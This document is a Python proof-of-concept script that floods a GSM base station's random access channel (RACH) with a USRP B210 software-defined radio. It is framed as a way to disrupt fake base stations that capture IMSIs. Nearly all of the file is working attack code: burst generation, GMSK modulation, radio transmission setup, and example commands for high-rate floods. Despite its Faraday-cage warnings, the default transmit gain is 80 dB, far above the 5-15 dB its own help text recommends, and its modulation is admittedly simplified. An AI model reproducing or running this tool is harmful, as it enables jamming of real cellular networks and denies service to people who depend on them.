#!/usr/bin/env python3
"""
GSM RACH Flooding PoC - USRP B210 Hardware Implementation
==========================================================

Optimized for USRP B210 with actual RF transmission.
Floods fake BTS RACH channel to prevent IMSI capture.

Hardware: USRP B210 (Ettus Research)
⚠️  WARNING: REQUIRES FARADAY CAGE - ACTUAL RF TRANSMISSION
"""

import sys
import time
import logging
import argparse
import numpy as np
from datetime import datetime

logger = logging.getLogger("rach_flood_usrp")

class ColoredFormatter(logging.Formatter):
    """Custom formatter with colors."""
    COLORS = {
        'INFO': '\033[37m',
        'WARNING': '\033[33m',
        'ERROR': '\033[31m',
        'RESET': '\033[0m'
    }
    
    def format(self, record):
        color = self.COLORS.get(record.levelname, '')
        reset = self.COLORS['RESET']
        record.levelname = f"{color}{record.levelname}{reset}"
        return super().format(record)

handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter('[%(levelname)s] %(message)s'))
logger.addHandler(handler)
logger.setLevel(logging.INFO)

try:
    from gnuradio import gr, blocks, analog, digital, uhd
    GNURADIO_AVAILABLE = True
except ImportError:
    GNURADIO_AVAILABLE = False
    logger.error("GNU Radio not available. Install: sudo apt-get install gnuradio")


class GSMRACHGenerator:
    """Generate GSM RACH bursts as IQ samples."""
    
    def __init__(self, sample_rate=2e6):
        self.sample_rate = sample_rate
        self.burst_count = 0
        
        # GSM parameters
        self.symbol_rate = 270833.333  # GSM symbol rate (270.833 kHz)
        self.samples_per_symbol = int(sample_rate / self.symbol_rate)
        self.bt = 0.3  # GMSK BT product
        
    def generate_rach_burst(self):
        """
        Generate a complete GSM RACH burst with GMSK modulation.
        
        Returns:
            numpy array of complex IQ samples
        """
        import random
        
        # RACH burst structure (88 bits total)
        burst_bits = []
        
        # 8-bit extended tail
        burst_bits.extend([0] * 8)
        
        # 41-bit sync sequence (training sequence)
        sync_seq = [0,1,0,0,1,0,1,1,0,1,1,1,1,1,1,1,1,0,0,1,1,0,0,1,1,0,1,0,1,0,1,0,0,0,1,1,1,1,0,0,0]
        burst_bits.extend(sync_seq)
        
        # 36-bit information (8-bit RACH ref + 5-bit BSIC + 23-bit padding)
        rach_ref = random.randint(0, 255)
        for i in range(7, -1, -1):
            burst_bits.append((rach_ref >> i) & 1)
        
        bsic = random.randint(0, 31)
        for i in range(4, -1, -1):
            burst_bits.append((bsic >> i) & 1)
        
        # Random padding
        burst_bits.extend([random.randint(0, 1) for _ in range(23)])
        
        # 3-bit tail
        burst_bits.extend([0] * 3)
        
        # Convert bits to GMSK modulated IQ samples
        iq_samples = self._gmsk_modulate(burst_bits)
        
        self.burst_count += 1
        return iq_samples
    
    def _gmsk_modulate(self, bits):
        """
        Simple GMSK modulation.
        
        For production use, implement proper Gaussian filter.
        This is a simplified version for demonstration.
        """
        # Convert bits to NRZ (-1, +1)
        nrz = np.array([2*b - 1 for b in bits], dtype=float)
        
        # Upsample
        upsampled = np.zeros(len(nrz) * self.samples_per_symbol)
        upsampled[::self.samples_per_symbol] = nrz
        
        # Simple Gaussian-like filter (simplified)
        # In production, use proper Gaussian filter with BT=0.3
        filter_len = self.samples_per_symbol * 4
        t = np.linspace(-2, 2, filter_len)
        gaussian_filter = np.exp(-t**2 / (2 * self.bt**2))
        gaussian_filter /= gaussian_filter.sum()
        
        # Filter
        filtered = np.convolve(upsampled, gaussian_filter, mode='same')
        
        # Integrate to get phase
        phase = np.cumsum(filtered) * np.pi / 2
        
        # Convert to IQ
        iq = np.exp(1j * phase).astype(np.complex64)
        
        # Normalize amplitude
        iq *= 0.7  # Keep some headroom
        
        return iq


class USRPRACHTransmitter(gr.top_block):
    """GNU Radio flowgraph for USRP B210 RACH transmission."""
    
    def __init__(self, frequency, sample_rate=2e6, tx_gain=80):
        gr.top_block.__init__(self, "USRP B210 RACH Transmitter")
        
        self.frequency = frequency
        self.sample_rate = sample_rate
        self.tx_gain = tx_gain
        
        logger.info("=" * 70)
        logger.info("Initializing USRP B210...")
        logger.info(f"  Frequency: {frequency/1e6:.3f} MHz")
        logger.info(f"  Sample rate: {sample_rate/1e6:.1f} Msps")
        logger.info(f"  TX gain: {tx_gain} dB")
        logger.info("=" * 70)
        
        # USRP Sink
        try:
            self.uhd_usrp_sink = uhd.usrp_sink(
                ",".join(("", "")),
                uhd.stream_args(
                    cpu_format="fc32",
                    channels=list(range(1)),
                ),
            )
            
            # Set parameters
            self.uhd_usrp_sink.set_samp_rate(sample_rate)
            self.uhd_usrp_sink.set_center_freq(frequency, 0)
            self.uhd_usrp_sink.set_gain(tx_gain, 0)
            self.uhd_usrp_sink.set_antenna('TX/RX', 0)
            
            # Get actual values
            actual_rate = self.uhd_usrp_sink.get_samp_rate()
            actual_freq = self.uhd_usrp_sink.get_center_freq()
            actual_gain = self.uhd_usrp_sink.get_gain()
            
            logger.info("USRP B210 initialized:")
            logger.info(f"  Actual sample rate: {actual_rate/1e6:.3f} Msps")
            logger.info(f"  Actual frequency: {actual_freq/1e6:.6f} MHz")
            logger.info(f"  Actual gain: {actual_gain:.1f} dB")
            
        except Exception as e:
            logger.error(f"Failed to initialize USRP: {e}")
            raise
        
        # Vector source for bursts
        self.vector_source = blocks.vector_source_c([], True, 1, [])
        
        # Connect
        self.connect(self.vector_source, self.uhd_usrp_sink)
        
        logger.info("Flowgraph connected successfully")
    
    def update_burst(self, iq_samples):
        """Update the burst being transmitted."""
        self.lock()
        self.vector_source.set_data(iq_samples.tolist())
        self.unlock()


def arfcn_to_frequency(arfcn):
    """Convert ARFCN to uplink frequency in Hz."""
    if 0 <= arfcn <= 124:
        # GSM-900
        return (890.0 + 0.2 * arfcn) * 1e6
    elif 975 <= arfcn <= 1023:
        # E-GSM-900
        return (890.0 + 0.2 * (arfcn - 1024)) * 1e6
    elif 512 <= arfcn <= 885:
        # DCS-1800
        return (1710.0 + 0.2 * (arfcn - 512)) * 1e6
    else:
        raise ValueError(f"Invalid ARFCN: {arfcn}")


def rach_flood_usrp(arfcn, duration=60, burst_rate=100, tx_gain=10):
    """
    Execute RACH flood with USRP B210.
    
    Args:
        arfcn: Target ARFCN
        duration: Flood duration in seconds
        burst_rate: Bursts per second
        tx_gain: TX gain in dB (0-89 for USRP B210)
    """
    
    if not GNURADIO_AVAILABLE:
        logger.error("GNU Radio not available - cannot proceed")
        return False
    
    # Convert ARFCN to frequency
    freq = arfcn_to_frequency(arfcn)
    logger.info(f"Target: ARFCN {arfcn} -> {freq/1e6:.3f} MHz (uplink)")
    
    # Safety countdown
    logger.warning("=" * 70)
    logger.warning("⚠️  ACTUAL RF TRANSMISSION STARTING")
    logger.warning("⚠️  ENSURE FARADAY CAGE IS SEALED")
    logger.warning("⚠️  USRP B210 WILL TRANSMIT ON {:.3f} MHz".format(freq/1e6))
    logger.warning("=" * 70)
    logger.warning("Starting in 5 seconds... Press Ctrl+C to abort")
    
    try:
        for i in range(5, 0, -1):
            logger.warning(f"  {i}...")
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Aborted by user")
        return False
    
    logger.info("Starting RACH flood transmission...")
    
    try:
        # Create RACH generator
        rach_gen = GSMRACHGenerator(sample_rate=2e6)
        
        # Create transmitter
        tb = USRPRACHTransmitter(
            frequency=freq,
            sample_rate=2e6,
            tx_gain=tx_gain
        )
        
        # Generate initial burst
        initial_burst = rach_gen.generate_rach_burst()
        tb.update_burst(initial_burst)
        
        # Start transmission
        tb.start()
        logger.info("✓ Transmission started")
        
        start_time = time.time()
        burst_count = 0
        burst_interval = 1.0 / burst_rate
        next_burst_time = start_time
        
        logger.info("=" * 70)
        logger.info("RACH FLOOD ACTIVE - CONTINUOUS MODE")
        logger.info("Transmitting bursts back-to-back for better spectrum visibility")
        logger.info("=" * 70)
        
        # Generate continuous burst stream (no gaps)
        # This makes it much easier to see in spectrum analyzer
        continuous_bursts = []
        for _ in range(burst_rate):
            burst = rach_gen.generate_rach_burst()
            continuous_bursts.extend(burst)
        
        # Convert to numpy array
        continuous_bursts = np.array(continuous_bursts, dtype=np.complex64)
        
        # Update with continuous burst stream
        tb.update_burst(continuous_bursts)
        
        logger.info(f"Loaded {len(continuous_bursts)} samples (continuous burst stream)")
        logger.info("This will repeat continuously - check spectrum analyzer now!")
        
        # Monitor transmission
        while (time.time() - start_time) < duration:
            current_time = time.time()
            elapsed = current_time - start_time
            
            # Estimate bursts transmitted (continuous, so rate * elapsed)
            burst_count = int(burst_rate * elapsed)
            
            # Progress update every second
            if int(elapsed) != int(elapsed - 0.1):  # New second
                actual_rate = burst_count / elapsed if elapsed > 0 else 0
                logger.info(
                    f"Bursts: {burst_count:6d} | "
                    f"Elapsed: {elapsed:5.1f}s | "
                    f"Rate: {actual_rate:6.1f} bursts/s"
                )
            
            # Small sleep to prevent CPU spinning
            time.sleep(0.1)
        
        # Stop transmission
        tb.stop()
        tb.wait()
        
        elapsed = time.time() - start_time
        actual_rate = burst_count / elapsed
        
        logger.info("=" * 70)
        logger.info("RACH FLOOD COMPLETED")
        logger.info("=" * 70)
        logger.info(f"Total bursts transmitted: {burst_count}")
        logger.info(f"Actual burst rate: {actual_rate:.1f} bursts/sec")
        logger.info(f"Total duration: {elapsed:.1f} seconds")
        logger.info(f"Target frequency: {freq/1e6:.3f} MHz")
        logger.info("=" * 70)
        
        return True
        
    except KeyboardInterrupt:
        logger.warning("\nTransmission interrupted by user")
        try:
            tb.stop()
            tb.wait()
        except:
            pass
        return False
        
    except Exception as e:
        logger.error(f"Transmission error: {e}")
        import traceback
        traceback.print_exc()
        try:
            tb.stop()
            tb.wait()
        except:
            pass
        return False


def main():
    parser = argparse.ArgumentParser(
        description="GSM RACH Flood - USRP B210 Implementation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  WARNING: This performs ACTUAL RF TRANSMISSION via USRP B210
    - Faraday cage is MANDATORY
    - Ensure proper RF licensing
    - Use minimal TX power for lab testing

Examples:
  # Basic usage (ARFCN 51, 60 seconds, gain 10 dB)
  python poc_rach_flood_usrp.py 51 --faraday-cage-confirmed
  
  # High rate flood (200 bursts/sec, 30 seconds)
  python poc_rach_flood_usrp.py 51 --burst-rate 200 --duration 30 --faraday-cage-confirmed
  
  # Lower power (gain 5 dB)
  python poc_rach_flood_usrp.py 62 --tx-gain 5 --faraday-cage-confirmed

USRP B210 Specifications:
  - Frequency: 70 MHz - 6 GHz
  - TX gain range: 0 - 89 dB
  - Sample rate: up to 61.44 Msps
  - Recommended gain for lab: 5-15 dB

Common ARFCNs:
  - ARFCN 51: 900.2 MHz (GSM-900)
  - ARFCN 62: 902.4 MHz (GSM-900)
  - ARFCN 700: 1750 MHz (DCS-1800)
        """
    )
    
    parser.add_argument("arfcn", type=int, help="Target ARFCN")
    parser.add_argument("--duration", type=int, default=60, 
                       help="Flood duration in seconds (default: 60)")
    parser.add_argument("--burst-rate", type=int, default=100, 
                       help="RACH bursts per second (default: 100)")
    parser.add_argument("--tx-gain", type=int, default=80, 
                       help="TX gain in dB, range 0-89 (default: 80)")
    parser.add_argument("--faraday-cage-confirmed", action="store_true", 
                       help="Confirm Faraday cage in use (REQUIRED)")
    
    args = parser.parse_args()
    
    # Validate TX gain
    if not (0 <= args.tx_gain <= 89):
        logger.error("TX gain must be between 0 and 89 dB for USRP B210")
        sys.exit(1)
    
    # Safety check
    if not args.faraday_cage_confirmed:
        logger.error("=" * 70)
        logger.error("SAFETY CHECK FAILED")
        logger.error("=" * 70)
        logger.error("You MUST confirm Faraday cage usage with:")
        logger.error("  --faraday-cage-confirmed")
        logger.error("")
        logger.error("RF transmission without proper shielding is:")
        logger.error("  - ILLEGAL in most jurisdictions")
        logger.error("  - Interferes with cellular networks")
        logger.error("  - Violates telecommunications regulations")
        logger.error("=" * 70)
        sys.exit(1)
    
    # Execute
    logger.info("=" * 70)
    logger.info("GSM RACH Flooding PoC - USRP B210")
    logger.info("=" * 70)
    logger.info(f"Target ARFCN: {args.arfcn}")
    logger.info(f"Duration: {args.duration} seconds")
    logger.info(f"Burst rate: {args.burst_rate} bursts/sec")
    logger.info(f"TX gain: {args.tx_gain} dB")
    logger.info("=" * 70)
    
    success = rach_flood_usrp(
        arfcn=args.arfcn,
        duration=args.duration,
        burst_rate=args.burst_rate,
        tx_gain=args.tx_gain
    )
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
